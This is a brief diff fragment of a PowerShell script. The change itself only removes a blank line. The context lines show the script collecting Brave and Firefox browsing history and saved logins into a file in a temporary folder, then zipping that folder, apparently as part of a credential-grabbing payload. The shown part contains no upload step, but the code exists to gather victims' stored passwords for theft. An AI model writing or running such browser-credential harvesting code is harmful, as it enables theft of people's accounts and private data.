@@ -527,7 +527,6 @@ Get-BrowserData -Browser "firefox" -DataType "logins" >> $env:TMP\$FolderName\Br
 Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
 
 Get-BrowserData -Browser "brave" -DataType "logins" >> $env:TMP\$FolderName\BrowserData.txt
-
 ############################################################################################################################################################
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
